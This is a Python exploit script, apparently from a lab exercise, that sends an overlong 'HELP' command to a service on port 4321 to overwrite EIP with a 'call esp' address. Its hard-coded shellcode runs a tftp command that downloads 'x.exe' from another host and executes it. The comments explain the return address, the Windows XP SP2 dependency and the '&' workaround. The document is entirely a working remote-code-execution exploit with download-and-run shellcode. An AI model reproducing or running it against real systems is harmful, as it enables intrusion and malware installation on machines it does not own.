#!/usr/bin/python

import sys, socket

#0x7e429353 : call esp | [USER32.dll] 
EIP = "\x53\x93\x42\x7e"

#39 byte shellcode. Uses a hard coded address for the system command, meaning it will only work on xp sp2 english systems.
#This basically drops into the command line and executes the following:
#tftp -i 192.168.56.1 get x.exe&x
#After pushing esp (requried for system command to work) the command got corrupted by appending esp to the front of tftp. This was
#bypassed by appending & to the front of tftp. Windows then itnerpreted this as a separate command.

#metasploits tftpserver was used to server x.exe in the /tmp folder, which served the exe to transfer and execute.

Payload = (
"\x54"
"\xE8\x21\x98\x9f\x77"
"\x26"
"\x74\x66\x74\x70"
"\x20\x2d\x69\x20"
"\x31\x39\x32\x2e"
"\x31\x36\x38\x2e"
"\x35\x36\x2e\x31"
"\x20\x67\x65\x74"
"\x20\x78\x2e\x65"
"\x78\x65\x26\x78"
"\x00"
)

#Push ebp, call 779f97f3
Setup = (
"\x28"*7
)

Crash = "HELP " + Setup + EIP + Payload + "\x28"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.101', 4321))

s.recv(1024)
s.send(Crash)
s.close
